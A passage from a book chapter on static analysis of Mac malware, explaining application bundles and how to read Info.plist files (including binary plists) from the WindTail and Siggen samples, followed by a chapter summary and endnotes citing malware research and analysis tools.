<li><em>Contents/Resources</em>: A directory that contains user interface elements of the application, such as images, documents, and <em>nib/xib</em> files that describe various user interfaces. </li>
<li><em>Contents/Info.plist</em>: The application’s main configuration file. Apple notes that macOS uses this file to ascertain pertinent information about the application (such as the location of the application’s main binary).</li>
</ul>
<p>Note that not all of the aforementioned files and directories of an application bundle are required. Though it’s unusual, if an <em>Info.plist</em> file is not found in the bundle, the operating system will assume that the application’s executable will be found in the <em>Contents/MacOS </em>directory with a name that matches the application bundle. For a comprehensive discussion of application bundles, see Apple’s authoritative developer documentation on the matter: “Bundle Structures.”<sup class="endnote"><a href="#c04-endnote-23" id="c04-noteref-23">23</a></sup></p>
<p>For the purposes of statically analyzing a malicious application, the two most important files are the application’s <em>Info.plist</em> file and its main executable. As we’ve discussed, when an application is launched, the system consults its <em>Info.plist</em> property list file if one is present, because it contains important metadata about the application stored in key/value pairs. Let’s take a look at a snippet of WindTail’s <em>Info.plist</em>, highlighting several key/value pairs of particular interest in the context of triaging an application (<a href="#listing4-32" id="listinganchor4-32">Listing 4-32</a>):</p>
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;<br/>&lt;plist version="1.0"&gt;<br/>&lt;dict&gt;<br/>        &lt;key&gt;BuildMachineOSBuild&lt;/key&gt;<br/>        &lt;string&gt;14B25&lt;/string&gt;<br/>        &lt;key&gt;CFBundleDevelopmentRegion&lt;/key&gt;<br/>        &lt;string&gt;en&lt;/string&gt;<br/>        &lt;key&gt;CFBundleExecutable&lt;/key&gt;<br/>        &lt;string&gt;usrnode&lt;/string&gt;<br/>        &lt;key&gt;CFBundleIconFile&lt;/key&gt;<br/>        &lt;string&gt;PPT3&lt;/string&gt;<br/>        &lt;key&gt;CFBundleIdentifier&lt;/key&gt;<br/>        &lt;string&gt;com.alis.tre&lt;/string&gt;<br/>        &lt;key&gt;CFBundleInfoDictionaryVersion&lt;/key&gt;<br/><span epub:type="pagebreak" id="Page_94" title="94"/>        &lt;string&gt;6.0&lt;/string&gt;<br/>        &lt;key&gt;CFBundleName&lt;/key&gt;<br/>        &lt;string&gt;usrnode&lt;/string&gt;<br/>        &lt;key&gt;LSMinimumSystemVersion&lt;/key&gt;<br/>        &lt;string&gt;10.7&lt;/string&gt;<br/>        ...<br/>        &lt;key&gt;NSUIElement&lt;/key&gt;<br/>        &lt;string&gt;1&lt;/string&gt;<br/>&lt;/dict&gt;<br/>&lt;/plist&gt;</code></pre>
<p class="CodeListingCaption"><a id="listing4-32">Listing 4-32</a>: An <em>Info.plist</em> file (WindTail)</p>
<p>WindTail’s <em>Info.plist</em> file begins with various key/value pairs describing the system on which the malware was compiled. For example, the <code>BuildMachineOSBuild</code> key contains a value of <code>14B25</code>, which is the build number of OS X Yosemite (10.10.1). Following this, we find the <code>CFBundleExecutable</code> key, which specifies to macOS which binary to execute when the application is launched. Thus, when WindTail is launched, the system will execute the <em>usrnode</em> binary from within the <em>Contents/MacOS</em> directory. This <code>CFBundleExecutable</code> key/value pair is generally necessary, as the application’s binary may not match the application’s name, or there may be several executable files within the <em>Contents/MacOS</em> directory. </p>
<p>From an analysis point of view, the other key/value pairs in the WindTail<em>Info.plist</em> file are less interesting, save for the <code>NSUIElement</code> key. This key, named <code>LSUIElement</code> on newer versions of macOS, tells the system to hide the application icon in the dock if it’s set to 1. Legitimate applications rarely have this key set. For more information about the keys and values in an application’s <em>Info.plist</em> file, see Apple’s document on the topic: “About Info.plist Keys and Values.”<sup class="endnote"><a href="#c04-endnote-24" id="c04-noteref-24">24</a></sup></p>
<p>Though you’ll generally find application <em>Info.plist</em> files written in plaintext XML, so they’re directly readable in the terminal or in a text editor, macOS also supports a binary property list (<em>plist</em>) format. Siggen is an example of malware with a malicious application containing an <em>Info.plist</em> file in this binary format (<a href="#listing4-33" id="listinganchor4-33">Listing 4-33</a>):</p>
<pre><code>% <b>file Siggen/WhatsAppService.app/Contents/Info.plist</b><br/>Siggen/WhatsAppService.app/Contents/Info.plist: Apple binary property list </code></pre>
<p class="CodeListingCaption"><a id="listing4-33">Listing 4-33</a>: Using <code>file</code> to identify a binary property list (Siggen) </p>
<p>To read this binary file format, use macOS’s <code>defaults</code> command with the <code>read</code> command line flag, as shown in <a href="#listing4-34" id="listinganchor4-34">Listing 4-34</a>: </p>
<pre><code>% <b>defaults read Siggen/WhatsAppService.app/Contents/Info.plist </b><br/>{<br/>    CFBundleDevelopmentRegion = en;<br/>    CFBundleExecutable = Dropbox;<br/>    CFBundleIconFile = "AppIcon.icns";<br/><span epub:type="pagebreak" id="Page_95" title="95"/>    CFBundleIdentifier = "inc.dropbox.com";<br/>    CFBundleInfoDictionaryVersion = "6.0";<br/>    CFBundleName = Dropbox;<br/>    CFBundleShortVersionString = "1.0";<br/>    CFBundleVersion = 1;<br/>    LSMinimumSystemVersion = "10.8.0";<br/>    LSUIElement = 1;<br/>    NSAppTransportSecurity = {<br/>        NSAllowsArbitraryLoads = 1;<br/>    };<br/>    NSHumanReadableCopyright = "\\U00a9 2019 Dropbox Inc.";<br/>    NSMainNibFile = MainMenu;<br/>    NSPrincipalClass = NSApplication;<br/>} </code></pre>
<p class="CodeListingCaption"><a id="listing4-34">Listing 4-34</a>: Using <code>defaults</code> to read a binary property list (Siggen)</p>
<p>As noted, the <code>CFBundleExecutable</code> key in an application’s <em>Info.plist</em> contains the name of the application’s main executable component. Though Siggen’s application is named <em>WhatsAppService.app</em>, its <em>Info.plist</em> file specifies that a binary named <em>Dropbox</em> should be executed when that application is launched.</p>
<p>It is worth pointing out that unless an application has been notarized, the other values in a malicious application’s <em>Info.plist</em> file may be deceptive. For example, Siggen sets its bundle identifier, <code>CFBundleIdentifier</code>, to <em>inc.dropbox.com</em> in an effort to masquerade as legitimate Dropbox software. </p>
<p>Once you’ve perused the <em>Info.plist</em> file, you’ll likely turn your attention toward analyzing the binary specified in the <code>CFBundleExecutable</code> key. More often than not, this binary is a Mach-O, the native executable file format of macOS. We’ll discuss this format in <span class="xref" itemid="xref_target_Chapter 5">Chapter 5</span>.</p>
<h2 id="h1-501942c04-0006">Up Next</h2>
<p class="BodyFirst">In this chapter, we introduced the concept of static analysis and highlighted how tools such as macOS’s built-in <code>file</code> utility and my own WYS, can identify a file’s true type. This is an important first analysis step, as many static analysis tools are file-type specific. We then examined various nonbinary file types commonly encountered while analyzing Mac malware. For each file type, we discussed its purpose and highlighted static analysis tools that you can use to analyze the file format. </p>
<p>However, this chapter focused only on the analysis of nonbinary file formats, such as distribution mediums and scripts. While many Mac malware specimens are scripts, the majority are compiled into Mach-O binaries. In the next chapter we’ll discuss this binary file format and then explore binary analysis tools and techniques.</p>
<h2 id="h1-501942c04-0007"><span epub:type="pagebreak" id="Page_96" title="96"/>Endnotes</h2>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-1" id="c04-endnote-1">1</a></sup>	Patrick Wardle, “What’s Your Sign,” <em>Objective-See</em>, <a class="LinkURL" href="https://objective-see.com/products/whatsyoursign.html">https://objective-see.com/products/whatsyoursign.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-2" id="c04-endnote-2">2</a></sup>	Jonathan Levin, “Demystifying the DMG File Format,” June 12, 2013, <a class="LinkURL" href="http://newosxbook.com/DMG.html">http://newosxbook.com/DMG.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-3" id="c04-endnote-3">3</a></sup>	“Suspicious Package,” <em>Mother’s Ruin Software</em>, <a class="LinkURL" href="https://mothersruin.com/software/SuspiciousPackage/">https://mothersruin.com/software/SuspiciousPackage/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-4" id="c04-endnote-4">4</a></sup>	Patrick Wardle, “Pass the AppleJeus,” <em>Objective-See</em>, October 12, 2019, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x49.html">https://objective-see.com/blog/blog_0x49.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-5" id="c04-endnote-5">5</a></sup>	Patrick Wardle, “OSX.Siggen,” <em>Objective-See</em>, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x53.html#osx-siggen">https://objective-see.com/blog/blog_0x53.html#osx-siggen</a>; “Mac.BackDoor.Siggen.20,” <em>Dr. Web Anti-virus</em>, <a class="LinkURL" href="https://vms.drweb.com/virus/?i=17783537/">https://vms.drweb.com/virus/?i=17783537/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-6" id="c04-endnote-6">6</a></sup>	Sveinbjorn Thordarson, “Platypus,” <a class="LinkURL" href="https://sveinbjorn.org/platypus/">https://sveinbjorn.org/platypus/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-7" id="c04-endnote-7">7</a></sup>	Phil Stokes, “MacOS Malware Outbreaks 2019 | The First 6 Months,” <em>SentinelOne blog</em>, July 1, 2019, <a class="LinkURL" href="https://www.sentinelone.com/blog/macos-malware-2019-first-six-months/">https://www.sentinelone.com/blog/macos-malware-2019-first-six-months/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-8" id="c04-endnote-8">8</a></sup>	Decompiler, <a class="LinkURL" href="https://decompiler.com/">https://decompiler.com/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-9" id="c04-endnote-9">9</a></sup>	uncompyle6, <a class="LinkURL" href="https://pypi.org/project/uncompyle6/">https://pypi.org/project/uncompyle6/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-10" id="c04-endnote-10">10</a></sup>	Patrick Wardle, “Mac Adware, à la Python,” <em>Objective-See</em>, March 25, 2019, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x3F.html">https://objective-see.com/blog/blog_0x3F.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-11" id="c04-endnote-11">11</a></sup>	Peter James, “New Malware DevilRobber Grabs Files and Bitcoins, Performs Bitcoin Mining, and More,” <em>The Mac Security Blog</em>, Intego, October 28, 2011, <a class="LinkURL" href="https://www.intego.com/mac-security-blog/new-malware-devilrobber-grabs-files-and-bitcoins-performs-bitcoin-mining-and-more/">https://www.intego.com/mac-security-blog/new-malware-devilrobber-grabs-files-and-bitcoins-performs-bitcoin-mining-and-more/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-12" id="c04-endnote-12">12</a></sup>	Phil Stokes, “Adventures in Reversing Malicious Run-Only AppleScripts,” <em>Sentinel Labs</em>, January 11, 2021, <a class="LinkURL" href="https://labs.sentinelone.com/fade-dead-adventures-in-reversing-malicious-run-only-applescripts/">https://labs.sentinelone.com/fade-dead-adventures-in-reversing-malicious-run-only-applescripts/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-13" id="c04-endnote-13">13</a></sup>	AppleScript disassembler, <a class="LinkURL" href="https://github.com/Jinmo/applescript-disassembler/">https://github.com/Jinmo/applescript-disassembler/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-14" id="c04-endnote-14">14</a></sup>	AppleScript Decompiler: aevt_decompile, <a class="LinkURL" href="https://github.com/SentineLabs/aevt_decompile/">https://github.com/SentineLabs/aevt_decompile/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-15" id="c04-endnote-15">15</a></sup>	Phil Stokes, “How AppleScript Is Used for Attacking macOS,” <em>SentinelOne blog</em>, March 16, 2020, <a class="LinkURL" href="https://www.sentinelone.com/blog/how-offensive-actors-use-applescript-for-attacking-macos/">https://www.sentinelone.com/blog/how-offensive-actors-use-applescript-for-attacking-macos/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-16" id="c04-endnote-16">16</a></sup>	Patrick Wardle, “Offensive Malware Analysis: Dissecting OSX/FruitFly.B via a Custom C&amp;C Server,” <em>Virus Bulletin</em>, October 2017, <a class="LinkURL" href="https://www.virusbulletin.com/uploads/pdf/magazine/2017/VB2017-Wardle.pdf">https://www.virusbulletin.com/uploads/pdf/magazine/2017/VB2017-Wardle.pdf</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-17" id="c04-endnote-17">17</a></sup>	“oletools—Python tools to analyze OLE and MS Office files,” <em>Decalage</em>, October 19, 2020, <a class="LinkURL" href="http://www.decalage.info/python/oletools/">http://www.decalage.info/python/oletools/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p><span epub:type="pagebreak" id="Page_97" title="97"/>	<sup class="endnote"><a href="#c04-noteref-18" id="c04-endnote-18">18</a></sup>	“Description of behaviors of AutoExec and AutoOpen macros in Word,” <em>Microsoft</em>, <a class="LinkURL" href="https://support.microsoft.com/en-us/help/286310/description-of-behaviors-of-autoexec-and-autoopen-macros-in-word">https://support.microsoft.com/en-us/help/286310/description-of-behaviors-of-autoexec-and-autoopen-macros-in-word</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-19" id="c04-endnote-19">19</a></sup>	EmPyre, <a class="LinkURL" href="https://github.com/EmpireProject/EmPyre/">https://github.com/EmpireProject/EmPyre/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-20" id="c04-endnote-20">20</a></sup>	Patrick Wardle, “New Attack, Old Tricks: Analyzing a malicious document with a mac-specific payload,” <em>Objective-See</em>, February 6, 2017, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x17.html">https://objective-see.com/blog/blog_0x17.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-21" id="c04-endnote-21">21</a></sup>	Patrick Wardle, “OSX.Yort,” <em>Objective-See</em>, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x53.html#osx-yort">https://objective-see.com/blog/blog_0x53.html#osx-yort</a>; Phil Stokes, “Lazarus APT Targets Mac Users with Poisoned Word Document,” <em>Sentinel Labs</em>, April 25, 2019, <a class="LinkURL" href="https://labs.sentinelone.com/lazarus-apt-targets-mac-users-poisoned-word-document/">https://labs.sentinelone.com/lazarus-apt-targets-mac-users-poisoned-word-document/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-22" id="c04-endnote-22">22</a></sup>	“Apparency: A User Guide,” <em>Mothers Ruin Software</em>, <a class="LinkURL" href="https://mothersruin.com/software/Apparency/use.html">https://mothersruin.com/software/Apparency/use.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-23" id="c04-endnote-23">23</a></sup>	“Bundle Structures,” <em>Apple Developer Documentation Archive</em>, <a class="LinkURL" href="https://developer.apple.com/library/archive/documentation/CoreFoundation/Conceptual/CFBundles/BundleTypes/BundleTypes.html#//apple_ref/doc/uid/10000123i-CH101-SW1">https://developer.apple.com/library/archive/documentation/CoreFoundation/Conceptual/CFBundles/BundleTypes/BundleTypes.html#//apple_ref/doc/uid/10000123i-CH101-SW1</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c04-noteref-24" id="c04-endnote-24">24</a></sup>	“About Info.plist Keys and Values,” <em>Apple Developer Documentation Archive</em>, <a class="LinkURL" href="https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html">https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html</a>.</p></aside>
</section>
</body>
</html>